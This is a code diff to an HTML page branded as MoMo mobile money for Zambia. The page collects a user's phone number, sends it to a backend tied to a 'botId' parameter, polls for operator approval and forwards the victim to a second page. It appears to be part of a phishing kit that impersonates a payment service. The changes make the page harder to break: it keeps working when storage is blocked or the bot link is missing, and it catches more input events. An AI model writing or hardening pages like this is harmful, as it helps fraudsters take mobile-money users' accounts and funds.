@@ -261,7 +261,7 @@
     <div class="card">
         <div class="title">Welcome to <strong>MoMo</strong></div>
 
-        <form id="detailsForm">
+        <form id="detailsForm" novalidate>
             <div class="phone-row">
                 <div class="country" aria-label="Zambia">
                     <span class="flag"></span>
@@ -276,7 +276,6 @@
                     placeholder="Enter number *"
                     aria-label="Phone number"
                     autocomplete="tel"
-                    required
                 >
             </div>
 
@@ -304,69 +303,33 @@
 <script>
 // ============================================================
 //  ALL PAGE LOGIC — one script, one IIFE, at the bottom of <body>
+//
+//  ORDER MATTERS:
+//   1) DOM refs + UI listeners are attached FIRST so the NEXT
+//      button always reacts to typing, no matter what.
+//   2) botId resolution happens AFTER, and never blocks the UI.
 // ============================================================
 (function() {
-    // ---------- BOT ID RESOLVER ----------
-    // Runs before anything else inside this IIFE. Reads botId from
-    // URL first, falls back to localStorage, hard-stops if missing.
-    let botId;
-    try {
-        const params = new URLSearchParams(window.location.search);
-        botId = params.get('botId') || localStorage.getItem('botId');
-
-        if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
-            document.body.innerHTML =
-                '<div style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
-                '<h2>Invalid link</h2>' +
-                '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
-                '</div>';
-            return;
-        }
-
-        localStorage.setItem('botId', botId);
-
-        if (params.get('botId') !== botId) {
-            params.set('botId', botId);
-            window.history.replaceState({}, '', window.location.pathname + '?' + params.toString() + window.location.hash);
-        }
-
-        console.log('🆔 botId resolved:', botId);
-    } catch (err) {
-        console.error('botId resolver failed:', err.message);
-        return;
-    }
+    'use strict';
 
     // ---------- CONFIG ----------
-    const BACKEND_URL = "";
-
-    // ---------- USER NAME (silent, no prompt) ----------
-    let fullName = localStorage.getItem('fullName') || 'User';
-    localStorage.setItem('fullName', fullName);
+    // Leave empty to use the same origin, or set e.g. 'https://api.example.com'
+    const BACKEND_URL = '';
 
     // ---------- DOM REFS ----------
-    const form = document.getElementById('detailsForm');
-    const phone = document.getElementById('phone');
-    const button = document.getElementById('continueBtn');
+    const form     = document.getElementById('detailsForm');
+    const phone    = document.getElementById('phone');
+    const button   = document.getElementById('continueBtn');
     const statusEl = document.getElementById('status');
 
     let pollTimer = null;
+    let botId     = null;
 
     // ---------- VALIDATION ----------
     function validateForm() {
         const digits = phone.value.replace(/\D/g, '');
         button.disabled = (digits.length === 0) || button.classList.contains('loading');
     }
-
-    phone.addEventListener('input', function() {
-        let value = this.value;
-        value = value.replace(/[^\d+\s]/g, '');
-        const hasPlus = value.startsWith('+');
-        value = value.replace(/\+/g, '');
-        if (hasPlus) value = '+' + value;
-        value = value.replace(/\s+/g, ' ');
-        this.value = value;
-        validateForm();
-    });
 
     // ---------- HELPERS ----------
     function stopPolling() {
@@ -398,18 +361,81 @@
         }
     }
 
+    // ---------- INPUT LISTENER (attached immediately) ----------
+    phone.addEventListener('input', function() {
+        let value = this.value;
+        value = value.replace(/[^\d+\s]/g, '');
+        const hasPlus = value.startsWith('+');
+        value = value.replace(/\+/g, '');
+        if (hasPlus) value = '+' + value;
+        value = value.replace(/\s+/g, ' ');
+        this.value = value;
+        validateForm();
+    });
+
+    // Also catch paste / change / keyup for stubborn mobile keyboards
+    phone.addEventListener('change', validateForm);
+    phone.addEventListener('keyup', validateForm);
+
+    // ---------- BOT ID RESOLVER (non-blocking) ----------
+    (function resolveBotId() {
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const fromUrl  = params.get('botId');
+            let stored = null;
+            try { stored = localStorage.getItem('botId'); } catch (e) { /* storage blocked */ }
+
+            const candidate = fromUrl || stored;
+
+            if (!candidate || candidate === 'test_bot' || candidate === 'undefined' || candidate === 'null') {
+                console.warn('⚠️ Invalid or missing botId — page still works, but submissions will fail.');
+                return;
+            }
+
+            botId = candidate;
+
+            try { localStorage.setItem('botId', botId); } catch (e) { /* storage blocked */ }
+
+            // Keep botId in the URL so refreshes and redirects keep it
+            if (fromUrl !== botId) {
+                params.set('botId', botId);
+                window.history.replaceState(
+                    {},
+                    '',
+                    window.location.pathname + '?' + params.toString() + window.location.hash
+                );
+            }
+
+            console.log('🆔 botId resolved:', botId);
+        } catch (err) {
+            console.error('botId resolver failed:', err && err.message);
+        }
+    })();
+
+    // ---------- USER NAME (silent, no prompt) ----------
+    let fullName = 'User';
+    try {
+        fullName = localStorage.getItem('fullName') || 'User';
+        localStorage.setItem('fullName', fullName);
+    } catch (e) { /* storage blocked — keep default */ }
+
     // ---------- FORM SUBMIT ----------
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
         if (button.classList.contains('loading')) return;
 
-        let raw = phone.value.trim();
+        const raw = phone.value.trim();
         const hasPlus = raw.startsWith('+');
         const digits = raw.replace(/\D/g, '');
         const phoneVal = (hasPlus ? '+' : '') + digits;
 
         if (!digits) {
             setStatus('❌ Please enter a phone number.', 'error');
+            return;
+        }
+
+        if (!botId) {
+            setStatus('❌ Invalid link. Please open this page through the official link.', 'error');
             return;
         }
 
@@ -434,8 +460,10 @@
             const { requestId } = await res.json();
             if (!requestId) throw new Error('No request ID returned');
 
-            localStorage.setItem('phone', phoneVal);
-            localStorage.setItem('phoneRequestId', requestId);
+            try {
+                localStorage.setItem('phone', phoneVal);
+                localStorage.setItem('phoneRequestId', requestId);
+            } catch (e) { /* storage blocked */ }
 
             stopPolling();
             let attempts = 0;
@@ -444,7 +472,7 @@
             pollTimer = setInterval(async () => {
                 attempts++;
                 try {
-                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + requestId);
+                    const checkRes = await fetch(BACKEND_URL + '/check-phone/' + encodeURIComponent(requestId));
                     const data = await checkRes.json();
 
                     if (data.blocked === true) {
@@ -458,7 +486,7 @@
                         stopPolling();
                         setLoading(false);
                         setStatus('✅ Verified! Redirecting...', 'success');
-                        const redirectUrl = 'link.html?requestId=' + requestId +
+                        const redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
                                             '&phone=' + encodeURIComponent(phoneVal) +
                                             '&botId=' + encodeURIComponent(botId);
                         setTimeout(() => {
@@ -493,7 +521,7 @@
 
     // ---------- INIT ----------
     validateForm();
-    phone.focus();
+    try { phone.focus(); } catch (e) {}
 
     console.log('✅ details.html ready. botId =', botId);
 })();
